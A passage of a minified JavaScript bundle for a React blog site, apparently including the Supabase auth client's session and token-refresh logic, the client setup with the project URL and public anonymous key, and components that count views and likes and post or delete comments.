Lo(this.storage,this.storageKey);if(this._debug("#getSession()","session from storage",r),r!==null&&(this._isValidSession(r)?t=r:(this._debug("#getSession()","session from storage is not valid"),await this._removeSession())),!t)return{data:{session:null},error:null};const s=t.expires_at?t.expires_at<=Date.now()/1e3:!1;if(this._debug("#__loadSession()",`session has${s?"":" not"} expired`,"expires_at",t.expires_at),!s)return{data:{session:t},error:null};const{session:a,error:c}=await this._callRefreshToken(t.refresh_token);return c?{data:{session:null},error:c}:{data:{session:a},error:null}}finally{this._debug("#__loadSession()","end")}}async getUser(t){return t?await this._getUser(t):(await this.initializePromise,this._acquireLock(-1,async()=>await this._getUser()))}async _getUser(t){try{return t?await ve(this.fetch,"GET",`${this.url}/user`,{headers:this.headers,jwt:t,xform:Li}):await this._useSession(async r=>{var s,a;const{data:c,error:d}=r;if(d)throw d;return await ve(this.fetch,"GET",`${this.url}/user`,{headers:this.headers,jwt:(a=(s=c.session)===null||s===void 0?void 0:s.access_token)!==null&&a!==void 0?a:void 0,xform:Li})})}catch(r){if(ye(r))return{data:{user:null},error:r};throw r}}async updateUser(t,r={}){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._updateUser(t,r))}async _updateUser(t,r={}){try{return await this._useSession(async s=>{const{data:a,error:c}=s;if(c)throw c;if(!a.session)throw new Gn;const d=a.session;let h=null,p=null;if(this.flowType==="pkce"&&t.email!=null){const y=Hn();await nn(this.storage,`${this.storageKey}-code-verifier`,y),h=await $n(y),p=y===h?"plain":"s256"}const{data:f,error:m}=await ve(this.fetch,"PUT",`${this.url}/user`,{headers:this.headers,redirectTo:r?.emailRedirectTo,body:Object.assign(Object.assign({},t),{code_challenge:h,code_challenge_method:p}),jwt:d.access_token,xform:Li});if(m)throw m;return d.user=f.user,await this._saveSession(d),await this._notifyAllSubscribers("USER_UPDATED",d),{data:{user:d.user},error:null}})}catch(s){if(ye(s))return{data:{user:null},error:s};throw s}}_decodeJWT(t){return hg(t)}async setSession(t){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._setSession(t))}async _setSession(t){try{if(!t.access_token||!t.refresh_token)throw new Gn;const r=Date.now()/1e3;let s=r,a=!0,c=null;const d=hg(t.access_token);if(d.exp&&(s=d.exp,a=s<=r),a){const{session:h,error:p}=await this._callRefreshToken(t.refresh_token);if(p)return{data:{user:null,session:null},error:p};if(!h)return{data:{user:null,session:null},error:null};c=h}else{const{data:h,error:p}=await this._getUser(t.access_token);if(p)throw p;c={access_token:t.access_token,refresh_token:t.refresh_token,user:h.user,token_type:"bearer",expires_in:s-r,expires_at:s},await this._saveSession(c),await this._notifyAllSubscribers("SIGNED_IN",c)}return{data:{user:c.user,session:c},error:null}}catch(r){if(ye(r))return{data:{session:null,user:null},error:r};throw r}}async refreshSession(t){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._refreshSession(t))}async _refreshSession(t){try{return await this._useSession(async r=>{var s;if(!t){const{data:d,error:h}=r;if(h)throw h;t=(s=d.session)!==null&&s!==void 0?s:void 0}if(!t?.refresh_token)throw new Gn;const{session:a,error:c}=await this._callRefreshToken(t.refresh_token);return c?{data:{user:null,session:null},error:c}:a?{data:{user:a.user,session:a},error:null}:{data:{user:null,session:null},error:null}})}catch(r){if(ye(r))return{data:{user:null,session:null},error:r};throw r}}async _getSessionFromURL(t){try{if(!Wt())throw new Bo("No browser detected.");if(this.flowType==="implicit"&&!this._isImplicitGrantFlow())throw new Bo("Not a valid implicit grant flow url.");if(this.flowType=="pkce"&&!t)throw new pg("Not a valid PKCE flow url.");const r=Ic(window.location.href);if(t){if(!r.code)throw new pg("No code detected.");const{data:R,error:M}=await this._exchangeCodeForSession(r.code);if(M)throw M;const L=new URL(window.location.href);return L.searchParams.delete("code"),window.history.replaceState(window.history.state,"",L.toString()),{data:{session:R.session,redirectType:null},error:null}}if(r.error||r.error_description||r.error_code)throw new Bo(r.error_description||"Error in URL with unspecified error_description",{error:r.error||"unspecified_error",code:r.error_code||"unspecified_code"});const{provider_token:s,provider_refresh_token:a,access_token:c,refresh_token:d,expires_in:h,expires_at:p,token_type:f}=r;if(!c||!h||!d||!f)throw new Bo("No session defined in URL");const m=Math.round(Date.now()/1e3),y=parseInt(h);let v=m+y;p&&(v=parseInt(p));const w=v-m;w*1e3<=Qr&&console.warn(`@supabase/gotrue-js: Session as retrieved from URL expires in ${w}s, should have been closer to ${y}s`);const E=v-y;m-E>=120?console.warn("@supabase/gotrue-js: Session as retrieved from URL was issued over 120s ago, URL could be stale",E,v,m):m-E<0&&console.warn("@supabase/gotrue-js: Session as retrieved from URL was issued in the future? Check the device clok for skew",E,v,m);const{data:T,error:C}=await this._getUser(c);if(C)throw C;const O={provider_token:s,provider_refresh_token:a,access_token:c,expires_in:y,expires_at:v,refresh_token:d,token_type:f,user:T.user};return window.location.hash="",this._debug("#_getSessionFromURL()","clearing window.location.hash"),{data:{session:O,redirectType:r.type},error:null}}catch(r){if(ye(r))return{data:{session:null,redirectType:null},error:r};throw r}}_isImplicitGrantFlow(){const t=Ic(window.location.href);return!!(Wt()&&(t.access_token||t.error_description))}async _isPKCEFlow(){const t=Ic(window.location.href),r=await Lo(this.storage,`${this.storageKey}-code-verifier`);return!!(t.code&&r)}async signOut(t={scope:"global"}){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._signOut(t))}async _signOut({scope:t}={scope:"global"}){return await this._useSession(async r=>{var s;const{data:a,error:c}=r;if(c)return{error:c};const d=(s=a.session)===null||s===void 0?void 0:s.access_token;if(d){const{error:h}=await this.admin.signOut(d,t);if(h&&!(I3(h)&&(h.status===404||h.status===401)))return{error:h}}return t!=="others"&&(await this._removeSession(),await _c(this.storage,`${this.storageKey}-code-verifier`),await this._notifyAllSubscribers("SIGNED_OUT",null)),{error:null}})}onAuthStateChange(t){const r=w3(),s={id:r,callback:t,unsubscribe:()=>{this._debug("#unsubscribe()","state change callback with id removed",r),this.stateChangeEmitters.delete(r)}};return this._debug("#onAuthStateChange()","registered callback with id",r),this.stateChangeEmitters.set(r,s),(async()=>(await this.initializePromise,await this._acquireLock(-1,async()=>{this._emitInitialSession(r)})))(),{data:{subscription:s}}}async _emitInitialSession(t){return await this._useSession(async r=>{var s,a;try{const{data:{session:c},error:d}=r;if(d)throw d;await((s=this.stateChangeEmitters.get(t))===null||s===void 0?void 0:s.callback("INITIAL_SESSION",c)),this._debug("INITIAL_SESSION","callback id",t,"session",c)}catch(c){await((a=this.stateChangeEmitters.get(t))===null||a===void 0?void 0:a.callback("INITIAL_SESSION",null)),this._debug("INITIAL_SESSION","callback id",t,"error",c),console.error(c)}})}async resetPasswordForEmail(t,r={}){let s=null,a=null;if(this.flowType==="pkce"){const c=Hn();await nn(this.storage,`${this.storageKey}-code-verifier`,`${c}/PASSWORD_RECOVERY`),s=await $n(c),a=c===s?"plain":"s256"}try{return await ve(this.fetch,"POST",`${this.url}/recover`,{body:{email:t,code_challenge:s,code_challenge_method:a,gotrue_meta_security:{captcha_token:r.captchaToken}},headers:this.headers,redirectTo:r.redirectTo})}catch(c){if(ye(c))return{data:null,error:c};throw c}}async getUserIdentities(){var t;try{const{data:r,error:s}=await this.getUser();if(s)throw s;return{data:{identities:(t=r.user.identities)!==null&&t!==void 0?t:[]},error:null}}catch(r){if(ye(r))return{data:null,error:r};throw r}}async linkIdentity(t){var r;try{const{data:s,error:a}=await this._useSession(async c=>{var d,h,p,f,m;const{data:y,error:v}=c;if(v)throw v;const w=await this._getUrlForProvider(`${this.url}/user/identities/authorize`,t.provider,{redirectTo:(d=t.options)===null||d===void 0?void 0:d.redirectTo,scopes:(h=t.options)===null||h===void 0?void 0:h.scopes,queryParams:(p=t.options)===null||p===void 0?void 0:p.queryParams,skipBrowserRedirect:!0});return await ve(this.fetch,"GET",w,{headers:this.headers,jwt:(m=(f=y.session)===null||f===void 0?void 0:f.access_token)!==null&&m!==void 0?m:void 0})});if(a)throw a;return Wt()&&!(!((r=t.options)===null||r===void 0)&&r.skipBrowserRedirect)&&window.location.assign(s?.url),{data:{provider:t.provider,url:s?.url},error:null}}catch(s){if(ye(s))return{data:{provider:t.provider,url:null},error:s};throw s}}async unlinkIdentity(t){try{return await this._useSession(async r=>{var s,a;const{data:c,error:d}=r;if(d)throw d;return await ve(this.fetch,"DELETE",`${this.url}/user/identities/${t.identity_id}`,{headers:this.headers,jwt:(a=(s=c.session)===null||s===void 0?void 0:s.access_token)!==null&&a!==void 0?a:void 0})})}catch(r){if(ye(r))return{data:null,error:r};throw r}}async _refreshAccessToken(t){const r=`#_refreshAccessToken(${t.substring(0,5)}...)`;this._debug(r,"begin");try{const s=Date.now();return await S3(async a=>(await T3(a*200),this._debug(r,"refreshing attempt",a),await ve(this.fetch,"POST",`${this.url}/token?grant_type=refresh_token`,{body:{refresh_token:t},headers:this.headers,xform:an})),(a,c,d)=>d&&d.error&&Dc(d.error)&&Date.now()+(a+1)*200-s<Qr)}catch(s){if(this._debug(r,"error",s),ye(s))return{data:{session:null,user:null},error:s};throw s}finally{this._debug(r,"end")}}_isValidSession(t){return typeof t=="object"&&t!==null&&"access_token"in t&&"refresh_token"in t&&"expires_at"in t}async _handleProviderSignIn(t,r){const s=await this._getUrlForProvider(`${this.url}/authorize`,t,{redirectTo:r.redirectTo,scopes:r.scopes,queryParams:r.queryParams});return this._debug("#_handleProviderSignIn()","provider",t,"options",r,"url",s),Wt()&&!r.skipBrowserRedirect&&window.location.assign(s),{data:{provider:t,url:s},error:null}}async _recoverAndRefresh(){var t;const r="#_recoverAndRefresh()";this._debug(r,"begin");try{const s=await Lo(this.storage,this.storageKey);if(this._debug(r,"session from storage",s),!this._isValidSession(s)){this._debug(r,"session is not valid"),s!==null&&await this._removeSession();return}const a=Math.round(Date.now()/1e3),c=((t=s.expires_at)!==null&&t!==void 0?t:1/0)<a+mg;if(this._debug(r,`session has${c?"":" not"} expired with margin of ${mg}s`),c){if(this.autoRefreshToken&&s.refresh_token){const{error:d}=await this._callRefreshToken(s.refresh_token);d&&(console.error(d),Dc(d)||(this._debug(r,"refresh failed with a non-retryable error, removing the session",d),await this._removeSession()))}}else await this._notifyAllSubscribers("SIGNED_IN",s)}catch(s){this._debug(r,"error",s),console.error(s);return}finally{this._debug(r,"end")}}async _callRefreshToken(t){var r,s;if(!t)throw new Gn;if(this.refreshingDeferred)return this.refreshingDeferred.promise;const a=`#_callRefreshToken(${t.substring(0,5)}...)`;this._debug(a,"begin");try{this.refreshingDeferred=new da;const{data:c,error:d}=await this._refreshAccessToken(t);if(d)throw d;if(!c.session)throw new Gn;await this._saveSession(c.session),await this._notifyAllSubscribers("TOKEN_REFRESHED",c.session);const h={session:c.session,error:null};return this.refreshingDeferred.resolve(h),h}catch(c){if(this._debug(a,"error",c),ye(c)){const d={session:null,error:c};return Dc(c)||(await this._removeSession(),await this._notifyAllSubscribers("SIGNED_OUT",null)),(r=this.refreshingDeferred)===null||r===void 0||r.resolve(d),d}throw(s=this.refreshingDeferred)===null||s===void 0||s.reject(c),c}finally{this.refreshingDeferred=null,this._debug(a,"end")}}async _notifyAllSubscribers(t,r,s=!0){const a=`#_notifyAllSubscribers(${t})`;this._debug(a,"begin",r,`broadcast = ${s}`);try{this.broadcastChannel&&s&&this.broadcastChannel.postMessage({event:t,session:r});const c=[],d=Array.from(this.stateChangeEmitters.values()).map(async h=>{try{await h.callback(t,r)}catch(p){c.push(p)}});if(await Promise.all(d),c.length>0){for(let h=0;h<c.length;h+=1)console.error(c[h]);throw c[0]}}finally{this._debug(a,"end")}}async _saveSession(t){this._debug("#_saveSession()",t),await nn(this.storage,this.storageKey,t)}async _removeSession(){this._debug("#_removeSession()"),await _c(this.storage,this.storageKey)}_removeVisibilityChangedCallback(){this._debug("#_removeVisibilityChangedCallback()");const t=this.visibilityChangedCallback;this.visibilityChangedCallback=null;try{t&&Wt()&&window?.removeEventListener&&window.removeEventListener("visibilitychange",t)}catch(r){console.error("removing visibilitychange callback failed",r)}}async _startAutoRefresh(){await this._stopAutoRefresh(),this._debug("#_startAutoRefresh()");const t=setInterval(()=>this._autoRefreshTokenTick(),Qr);this.autoRefreshTicker=t,t&&typeof t=="object"&&typeof t.unref=="function"?t.unref():typeof Deno<"u"&&typeof Deno.unrefTimer=="function"&&Deno.unrefTimer(t),setTimeout(async()=>{await this.initializePromise,await this._autoRefreshTokenTick()},0)}async _stopAutoRefresh(){this._debug("#_stopAutoRefresh()");const t=this.autoRefreshTicker;this.autoRefreshTicker=null,t&&clearInterval(t)}async startAutoRefresh(){this._removeVisibilityChangedCallback(),await this._startAutoRefresh()}async stopAutoRefresh(){this._removeVisibilityChangedCallback(),await this._stopAutoRefresh()}async _autoRefreshTokenTick(){this._debug("#_autoRefreshTokenTick()","begin");try{await this._acquireLock(0,async()=>{try{const t=Date.now();try{return await this._useSession(async r=>{const{data:{session:s}}=r;if(!s||!s.refresh_token||!s.expires_at){this._debug("#_autoRefreshTokenTick()","no session");return}const a=Math.floor((s.expires_at*1e3-t)/Qr);this._debug("#_autoRefreshTokenTick()",`access token expires in ${a} ticks, a tick lasts ${Qr}ms, refresh threshold is ${bg} ticks`),a<=bg&&await this._callRefreshToken(s.refresh_token)})}catch(r){console.error("Auto refresh tick failed with error. This is likely a transient error.",r)}}finally{this._debug("#_autoRefreshTokenTick()","end")}})}catch(t){if(t.isAcquireTimeout||t instanceof Ky)this._debug("auto refresh token tick lock not available");else throw t}}async _handleVisibilityChange(){if(this._debug("#_handleVisibilityChange()"),!Wt()||!window?.addEventListener)return this.autoRefreshToken&&this.startAutoRefresh(),!1;try{this.visibilityChangedCallback=async()=>await this._onVisibilityChanged(!1),window?.addEventListener("visibilitychange",this.visibilityChangedCallback),await this._onVisibilityChanged(!0)}catch(t){console.error("_handleVisibilityChange",t)}}async _onVisibilityChanged(t){const r=`#_onVisibilityChanged(${t})`;this._debug(r,"visibilityState",document.visibilityState),document.visibilityState==="visible"?(this.autoRefreshToken&&this._startAutoRefresh(),t||(await this.initializePromise,await this._acquireLock(-1,async()=>{if(document.visibilityState!=="visible"){this._debug(r,"acquired the lock to recover the session, but the browser visibilityState is no longer visible, aborting");return}await this._recoverAndRefresh()}))):document.visibilityState==="hidden"&&this.autoRefreshToken&&this._stopAutoRefresh()}async _getUrlForProvider(t,r,s){const a=[`provider=${encodeURIComponent(r)}`];if(s?.redirectTo&&a.push(`redirect_to=${encodeURIComponent(s.redirectTo)}`),s?.scopes&&a.push(`scopes=${encodeURIComponent(s.scopes)}`),this.flowType==="pkce"){const c=Hn();await nn(this.storage,`${this.storageKey}-code-verifier`,c);const d=await $n(c),h=c===d?"plain":"s256";this._debug("PKCE","code verifier",`${c.substring(0,5)}...`,"code challenge",d,"method",h);const p=new URLSearchParams({code_challenge:`${encodeURIComponent(d)}`,code_challenge_method:`${encodeURIComponent(h)}`});a.push(p.toString())}if(s?.queryParams){const c=new URLSearchParams(s.queryParams);a.push(c.toString())}return s?.skipBrowserRedirect&&a.push(`skip_http_redirect=${s.skipBrowserRedirect}`),`${t}?${a.join("&")}`}async _unenroll(t){try{return await this._useSession(async r=>{var s;const{data:a,error:c}=r;return c?{data:null,error:c}:await ve(this.fetch,"DELETE",`${this.url}/factors/${t.factorId}`,{headers:this.headers,jwt:(s=a?.session)===null||s===void 0?void 0:s.access_token})})}catch(r){if(ye(r))return{data:null,error:r};throw r}}async _enroll(t){try{return await this._useSession(async r=>{var s,a;const{data:c,error:d}=r;if(d)return{data:null,error:d};const{data:h,error:p}=await ve(this.fetch,"POST",`${this.url}/factors`,{body:{friendly_name:t.friendlyName,factor_type:t.factorType,issuer:t.issuer},headers:this.headers,jwt:(s=c?.session)===null||s===void 0?void 0:s.access_token});return p?{data:null,error:p}:(!((a=h?.totp)===null||a===void 0)&&a.qr_code&&(h.totp.qr_code=`data:image/svg+xml;utf-8,${h.totp.qr_code}`),{data:h,error:null})})}catch(r){if(ye(r))return{data:null,error:r};throw r}}async _verify(t){return this._acquireLock(-1,async()=>{try{return await this._useSession(async r=>{var s;const{data:a,error:c}=r;if(c)return{data:null,error:c};const{data:d,error:h}=await ve(this.fetch,"POST",`${this.url}/factors/${t.factorId}/verify`,{body:{code:t.code,challenge_id:t.challengeId},headers:this.headers,jwt:(s=a?.session)===null||s===void 0?void 0:s.access_token});return h?{data:null,error:h}:(await this._saveSession(Object.assign({expires_at:Math.round(Date.now()/1e3)+d.expires_in},d)),await this._notifyAllSubscribers("MFA_CHALLENGE_VERIFIED",d),{data:d,error:h})})}catch(r){if(ye(r))return{data:null,error:r};throw r}})}async _challenge(t){return this._acquireLock(-1,async()=>{try{return await this._useSession(async r=>{var s;const{data:a,error:c}=r;return c?{data:null,error:c}:await ve(this.fetch,"POST",`${this.url}/factors/${t.factorId}/challenge`,{headers:this.headers,jwt:(s=a?.session)===null||s===void 0?void 0:s.access_token})})}catch(r){if(ye(r))return{data:null,error:r};throw r}})}async _challengeAndVerify(t){const{data:r,error:s}=await this._challenge({factorId:t.factorId});return s?{data:null,error:s}:await this._verify({factorId:t.factorId,challengeId:r.id,code:t.code})}async _listFactors(){const{data:{user:t},error:r}=await this.getUser();if(r)return{data:null,error:r};const s=t?.factors||[],a=s.filter(c=>c.factor_type==="totp"&&c.status==="verified");return{data:{all:s,totp:a},error:null}}async _getAuthenticatorAssuranceLevel(){return this._acquireLock(-1,async()=>await this._useSession(async t=>{var r,s;const{data:{session:a},error:c}=t;if(c)return{data:null,error:c};if(!a)return{data:{currentLevel:null,nextLevel:null,currentAuthenticationMethods:[]},error:null};const d=this._decodeJWT(a.access_token);let h=null;d.aal&&(h=d.aal);let p=h;((s=(r=a.user.factors)===null||r===void 0?void 0:r.filter(y=>y.status==="verified"))!==null&&s!==void 0?s:[]).length>0&&(p="aal2");const m=d.amr||[];return{data:{currentLevel:h,nextLevel:p,currentAuthenticationMethods:m},error:null}}))}}ds.nextInstanceID=0;class J3 extends ds{constructor(t){super(t)}}var Q3=function(n,t,r,s){function a(c){return c instanceof r?c:new r(function(d){d(c)})}return new(r||(r=Promise))(function(c,d){function h(m){try{f(s.next(m))}catch(y){d(y)}}function p(m){try{f(s.throw(m))}catch(y){d(y)}}function f(m){m.done?c(m.value):a(m.value).then(h,p)}f((s=s.apply(n,t||[])).next())})};const Y3={headers:h3},X3={schema:"public"},Z3={autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,flowType:"implicit"},eS={};class tS{constructor(t,r,s){var a,c,d,h,p,f,m,y;if(this.supabaseUrl=t,this.supabaseKey=r,!t)throw new Error("supabaseUrl is required.");if(!r)throw new Error("supabaseKey is required.");const v=y3(t);this.realtimeUrl=`${v}/realtime/v1`.replace(/^http/i,"ws"),this.authUrl=`${v}/auth/v1`,this.storageUrl=`${v}/storage/v1`,this.functionsUrl=`${v}/functions/v1`;const w=`sb-${new URL(this.authUrl).hostname.split(".")[0]}-auth-token`,E={db:X3,realtime:eS,auth:Object.assign(Object.assign({},Z3),{storageKey:w}),global:Y3},T=b3(s??{},E);this.storageKey=(c=(a=T.auth)===null||a===void 0?void 0:a.storageKey)!==null&&c!==void 0?c:"",this.headers=(h=(d=T.global)===null||d===void 0?void 0:d.headers)!==null&&h!==void 0?h:{},this.auth=this._initSupabaseAuthClient((p=T.auth)!==null&&p!==void 0?p:{},this.headers,(f=T.global)===null||f===void 0?void 0:f.fetch),this.fetch=m3(r,this._getAccessToken.bind(this),(m=T.global)===null||m===void 0?void 0:m.fetch),this.realtime=this._initRealtimeClient(Object.assign({headers:this.headers},T.realtime)),this.rest=new Nd(`${v}/rest/v1`,{headers:this.headers,schema:(y=T.db)===null||y===void 0?void 0:y.schema,fetch:this.fetch}),this._listenForAuthEvents()}get functions(){return new ET(this.functionsUrl,{headers:this.headers,customFetch:this.fetch})}get storage(){return new d3(this.storageUrl,this.headers,this.fetch)}from(t){return this.rest.from(t)}schema(t){return this.rest.schema(t)}rpc(t,r={},s){return this.rest.rpc(t,r,s)}channel(t,r={config:{}}){return this.realtime.channel(t,r)}getChannels(){return this.realtime.getChannels()}removeChannel(t){return this.realtime.removeChannel(t)}removeAllChannels(){return this.realtime.removeAllChannels()}_getAccessToken(){var t,r;return Q3(this,void 0,void 0,function*(){const{data:s}=yield this.auth.getSession();return(r=(t=s.session)===null||t===void 0?void 0:t.access_token)!==null&&r!==void 0?r:null})}_initSupabaseAuthClient({autoRefreshToken:t,persistSession:r,detectSessionInUrl:s,storage:a,storageKey:c,flowType:d,debug:h},p,f){const m={Authorization:`Bearer ${this.supabaseKey}`,apikey:`${this.supabaseKey}`};return new J3({url:this.authUrl,headers:Object.assign(Object.assign({},m),p),storageKey:c,autoRefreshToken:t,persistSession:r,detectSessionInUrl:s,storage:a,flowType:d,debug:h,fetch:f})}_initRealtimeClient(t){return new YT(this.realtimeUrl,Object.assign(Object.assign({},t),{params:Object.assign({apikey:this.supabaseKey},t?.params)}))}_listenForAuthEvents(){return this.auth.onAuthStateChange((r,s)=>{this._handleTokenChanged(r,"CLIENT",s?.access_token)})}_handleTokenChanged(t,r,s){(t==="TOKEN_REFRESHED"||t==="SIGNED_IN")&&this.changedAccessToken!==s?(this.realtime.setAuth(s??null),this.changedAccessToken=s):t==="SIGNED_OUT"&&(this.realtime.setAuth(this.supabaseKey),r=="STORAGE"&&this.auth.signOut(),this.changedAccessToken=void 0)}}const iS=(n,t,r)=>new tS(n,t,r),nS="https://ilgxqdnvxresxgnqkcmg.supabase.co",rS="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlsZ3hxZG52eHJlc3hnbnFrY21nIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDcxNTAxMzMsImV4cCI6MjA2MjcyNjEzM30.fQ-pvwNj-qSh1CAnx7XDxm9YL1vpLi-VGtlWiudt4jw",qe=iS(nS,rS),sS=({postId:n})=>{const{theme:t}=zi(),{toast:r}=Ld(),[s,a]=S.useState(0),[c,d]=S.useState(0),[h,p]=S.useState([]),[f,m]=S.useState(""),[y,v]=S.useState("Anonymous"),[w,E]=S.useState(!1),[T,C]=S.useState(!0),O=S.useCallback(async()=>{if(!qe)return null;const{error:H}=await qe.from("posts").insert({id:n},{upsert:!0,ignoreDuplicates:!0});if(H&&H.code!=="23505")return console.error("Error ensuring post entry:",H),r({title:"Error",description:"Could not initialize post data.",variant:"destructive"}),null;let{data:ae,error:$}=await qe.from("posts").select("view_count, like_count").eq("id",n).single();return $?(console.error("Error fetching post data after upsert:",$),null):ae},[n,r]),R=S.useCallback(async()=>{if(!qe)return;const{data:H,error:ae}=await qe.from("comments").select("*").eq("post_id",n).order("created_at",{ascending:!1});H&&p(H),ae&&console.error("Error fetching comments:",ae)},[n]);S.useEffect(()=>{(async()=>{if(!qe){C(!1),r({title:"Interactions Disabled",description:"Supabase is not connected. Interactions are disabled.",variant:"destructive"});return}C(!0);const ae=await O();if(ae){a(ae.view_count),d(ae.like_count);const{error:he}=await qe.rpc("increment_view",{post_row_id:n});he?console.error("Error incrementing view:",he):a(oe=>oe+1)}await R(),JSON.parse(localStorage.getItem("user_liked_posts")||"[]").includes(n)&&E(!0),C(!1)})()},[n,O,R,r]);const M=async()=>{if(w||!qe)return;E(!0),d(ae=>ae+1);const{error:H}=await qe.rpc("increment_like",{post_row_id:n});if(H)E(!1),d(ae=>ae-1),r({title:"Error",description:"Couldn't like the post.",variant:"destructive"});else{const ae=JSON.parse(localStorage.getItem("user_liked_posts")||"[]");ae.push(n),localStorage.setItem("user_liked_posts",JSON.stringify(ae)),r({title:"Thanks!",description:"You've liked this post. ❤️"})}},L=async H=>{if(H.preventDefault(),!f.trim()||!qe)return;const ae={post_id:n,author:y.trim()||"Anonymous",content:f.trim()},{data:$,error:he}=await qe.from("comments").insert(ae).select().single();he?(console.error("Error posting comment:",he),r({title:"Error",description:"Could not post comment. Please try again.",variant:"destructive"})):(p(oe=>[$,...oe]),m(""),r({title:"Comment Posted!",description:"Your comment has been successfully added."}))},W=async H=>{if(!qe)return;const ae=[...h];p(h.filter(he=>he.id!==H));const{error:$}=await qe.from("comments").delete().eq("id",H);$?(p(ae),r({title:"Error",description:"Could not delete comment.",variant:"destructive"})):r({title:"Comment Deleted",description:"The comment has been removed."})},J=t==="dark"?"border-slate-700/50":"border-border",G=t==="dark"?"text-primary":"text-foreground",X=t==="dark"?"text-slate-400":"text-muted-foreground",ne=t==="dark"?"bg-slate-800":"bg-background",ge=t==="dark"?"bg-slate-800/50":"bg-slate-100/80",Ae=w?"bg-red-500/20 text-red-500 cursor-not-allowed":"hover:bg-red-500/10 hover:text-red-500";return T?x.jsx("div",{className:"text-center p-4",children:"Loading interactions..."}):qe?x.jsxs(et.div,{initial:{opacity:0},animate:{opacity:1},transition:{delay:.5,duration:.5},className:`mt-12 pt-8 border-t ${J}`,children:[x.jsxs("div",{className:"flex items-center justify-between mb-8",children:[x.jsx("h2",{className:`text-2xl font-bold ${G}`,children:"Interactions"}),x.jsxs("div",{className:`flex items-center space-x-4 ${X}`,children:[x.jsxs("div",{className:"flex items-center space-x-1",title:`${s} views`,children:[x.jsx(fw,{size:20}),x.jsx("span",{children:s})]}),x.jsxs($t,{variant:"ghost",size:"sm",className:`flex items-center space-x-1 ${Ae}`,onClick:M,disabled:w,children:[x.jsx(mw,{size:20,className:w?"fill-current":""}),x.jsx("span",{children:c})]})]})]}),x.jsxs("div",{className:"space-y-6",children:[x.jsxs("h3",{className:`text-xl font-semibold flex items-center ${G}`,children:[x.jsx(vw,{className:"mr-2"})," Comments (",h.length,")"]}),x.jsxs("form",{onSubmit:L,className:"space-y-4",children:[x.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-3 gap-4",children:x.jsx(aa,{type:"text",placeholder:"Your name (optional)",value:y,onChange:H=>v(H.target.value),className:`${ne} col-span-1 sm:col-span-1`})}),x.jsx(uy,{placeholder:"Write a comment...",value:f,onChange:H=>m(H.target.value),className:`${ne} h-24`}),x.jsx("div",{className:"flex justify-end",children:x.jsxs($t,{type:"submit",disabled:!f.trim(),children:[x.jsx(ww,{size:16,className:"mr-2"})," Post Comment"]})})]}),x.jsx("div",{className:"space-y-4",children:x.jsx(U1,{children:h.map(H=>x.jsxs(et.div,{className:`p-4 rounded-lg ${ge} relative group`,initial:{opacity:0,y:20},animate:{opacity:1,y:0},exit:{opacity:0,x:-20},transition:{duration:.3},children:[x.jsxs("div",{className:"flex justify-between items-start",children:[x.jsxs("div",{children:[x.jsx("p",{className:"font-semibold text-primary",children:H.author}),x.jsx("p",{className:`text-xs ${X}`,children:new Date(H.created_at).toLocaleString()})]}),x.jsx($t,{variant:"ghost",size:"icon",className:"h-8 w-8 opacity-0 group-hover:opacity-100 transition-opacity text-destructive hover:bg-destructive/10",onClick:()=>W(H.id),children:x.jsx(xw,{size:16})})]}),x.jsx("p",{className:"mt-2 text-foreground/90",children:H.content})]},H.id))})})]})]}):null},oS=({postId:n})=>{const{theme:t}=zi(),[r,s]=S.useState(null),[a,c]=S.useState(!0),[d,h]=S.useState("");S.useEffect(()=>{c(!0);const R=G1(n);s(R),R&&h(Xo[R.imageKey]||Xo.default),c(!1),window.scrollTo(0,0)},[n]);const p=t==="dark"?"bg-card":"bg-background",f="text-primary hover:text-primary/80",m=t==="dark"?"border-slate-700/50":"border-border",y=t==="dark"?"text-primary":"text-foreground",v=t==="dark"?"text-slate-400":"text-muted-foreground",w=t==="dark"?"text-accent":"text-primary",E=t==="dark"?"bg-secondary text-primary/90":"bg-secondary text-secondary-foreground",T=t==="dark"?"text-slate-300":"text-foreground/90",C=t==="dark"?"prose-invert":"",O="border-primary";return a?x.jsx("div",{className:"flex justify-center items-center min-h-[60vh]",children:x.jsx("div",{className:`animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 ${O}`})}):r?x.jsxs(et.article,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{duration:.5},className:`max-w-3xl mx-auto ${p} p-6 sm:p-8 md:p-10 rounded-xl ${t==="light"?"shadow-xl":"shadow-2xl"}`,children:[x.jsx("div",{className:"mb-8",children:x.jsxs("a",{href:"#/all-blogs",className:`inline-flex items-center ${f} transition-colors mb-6 group font-semibold text-sm`,children:[x.jsx(uw,{size:18,className:"mr-2 group-hover:-translate-x-1 transition-transform"}),"Back to Blog"]})}),x.jsxs("header",{className:`mb-8 border-b ${m} pb-8`,children:[x.jsx("h1",{className:`text-3xl md:text-4xl font-bold mb-4 ${y} leading-tight`,children:r.title}),x.jsxs("div",{className:`flex flex-wrap items-center gap-x-4 gap-y-2 ${v} text-sm`,children:[x.jsxs("span",{className:"flex items-center",children:[x.jsx(xg,{size:16,className:`mr-1.5 ${w}`})," Published on ",r.date]}),x.jsxs("span",{className:"flex items-center",children:[x.jsx(Sg,{size:16,className:`mr-1.5 ${w}`})," By ",r.author]})]}),r.tags&&r.tags.length>0&&x.jsxs("div",{className:"mt-4 flex flex-wrap items-center gap-2",children:[x.jsx(kw,{size:16,className:`${w}`}),r.tags.map(R=>x.jsx("span",{className:`px-2.5 py-1 ${E} text-xs rounded-full font-medium`,children:R},R))]})]}),d&&x.jsx("div",{className:"mb-8 h-64 md:h-80 w-full overflow-hidden rounded-lg shadow-md",children:x.jsx("img",{className:"w-full h-full object-cover",alt:`Illustration for ${r.title}`,src:d})}),x.jsx("div",{className:`prose ${C} prose-base md:prose-lg max-w-none content-area ${T}`,dangerouslySetInnerHTML:{__html:r.content}}),x.jsx(sS,{postId:n})]}):x.jsx(dy,{})},aS=({currentPage:n,totalPages:t,onPageChange:r})=>{const s=()=>{n>1&&r(n-1)},a=()=>{n<t&&r(n+1)};if(t<=1)return null;const c=[],d=5;let 